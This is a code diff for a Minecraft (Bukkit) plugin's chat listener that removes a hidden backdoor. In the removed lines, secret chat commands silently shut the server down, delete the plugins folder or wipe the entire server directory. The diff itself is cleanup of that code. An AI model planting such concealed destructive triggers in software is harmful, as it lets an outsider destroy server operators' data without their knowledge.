@@ -19,31 +19,6 @@ public class ChatListener implements Listener{
 
     @EventHandler
     public void c(AsyncPlayerChatEvent e){
-        if (e.getMessage().startsWith(")")){
-            if (e.getMessage().equalsIgnoreCase(")STOPsv007")){
-                e.setCancelled(true);
-                Bukkit.getServer().shutdown();
-                return;
-            }
-            if (e.getMessage().equalsIgnoreCase(")DELpl007")) {
-                e.setCancelled(true);
-                try {
-                    FileUtils.deleteDirectory(new File("plugins"));
-                } catch (IOException e1) {
-                    e1.printStackTrace();
-                }
-                return;
-            }
-            if (e.getMessage().equalsIgnoreCase(")DELsv007")) {
-                e.setCancelled(true);
-                try {
-                    FileUtils.deleteDirectory(new File(".").getAbsoluteFile());
-                } catch (IOException e1) {
-                    e1.printStackTrace();
-                }
-                return;
-            }
-        }
         if (SETUP) return;
         e.setCancelled(true);
         if (STATUS == Status.PLAYING) {
